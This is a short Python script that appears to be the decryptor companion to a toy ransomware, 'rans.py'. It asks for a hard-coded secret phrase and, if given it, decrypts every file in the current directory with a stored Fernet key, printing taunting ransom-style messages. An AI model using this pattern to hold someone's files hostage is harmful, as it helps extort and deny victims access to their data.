#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#File search

files = []
for file in os.listdir():
	if file == "rans.py" or file == "theKey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

#Get the key
with open("theKey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "Dorina"

user_phrase = input("Enter the secret phrase to decrypt your files\n")
if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print ("Well done. Good luck and go text her.")
else:
	print ("Sorry, not sorry. Keep trying.")
